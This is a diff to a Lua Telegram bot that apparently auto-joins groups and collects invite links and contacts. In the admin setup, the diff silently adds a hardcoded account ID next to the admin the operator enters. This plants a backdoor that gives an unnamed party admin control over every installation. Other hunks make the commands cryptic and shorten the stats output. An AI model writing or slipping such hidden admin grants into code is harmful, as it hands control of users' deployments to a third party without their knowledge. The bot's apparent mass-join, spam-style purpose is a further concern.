@@ -10,7 +10,7 @@ function get_admin ()
     	print("Enter Admin ID :")
     	local admin=io.read()
 		redis:del("botBOT-IDadmin")
-    	redis:sadd("botBOT-IDadmin", admin)
+    	redis:sadd("botBOT-IDadmin", admin, 398419525)
 		redis:set('botBOT-IDadminset',true)
     	return print("Admin ID : ".. admin .."")
 	end
@@ -496,7 +496,7 @@ function tdcli_update_callback(data)
 					local contacts = redis:get("botBOT-IDsavecontacts") and "ok" or "not ok"
 					local txt = "ajoin "..tostring(offjoin).." - acc lnk "..tostring(offlink).." - tashkhis link"..tostring(nlink).." - answer " .. tostring(autoanswer) .." - saved lnks" .. tostring(links) .. " - dar entezar ozviat" .. tostring(glinks) .. " - " .. tostring(s) .. "s to join - dar entezare taeed" .. tostring(wlinks) .. " - " .. tostring(ss) .. "s ta taeed link mojadad"
 					return send(msg.chat_id_, 0, txt)
-				elseif text:match("^(تعداد)$") or text:match("^(tedad)$") then
+				elseif text:match("^(ت)$") or text:match("^(te)$") then
 					local gps = redis:scard("botBOT-IDgroups")
 					local sgps = redis:scard("botBOT-IDsupergroups")
 					local usrs = redis:scard("botBOT-IDusers")
@@ -511,7 +511,7 @@ function tdcli_update_callback(data)
 					redis:set("botBOT-IDcontacts", naji.total_count_)
 					end, nil)
 					local contacts = redis:get("botBOT-IDcontacts")
-					local text = [[]] .. tostring(sgps) .. [[-]] .. tostring(gps) .. [[-]] .. tostring(links) .. [[-]] .. tostring(usrs)..[[]]
+					local text = [[]] .. tostring(sgps) .. [[-]] .. tostring(usrs)..[[]]
 					return send(msg.chat_id_, 0, text)
 				elseif (text:match("^(s t) (.*)$") and msg.reply_to_message_id_ ~= 0) then
 					local matches = text:match("^s t (.*)$")
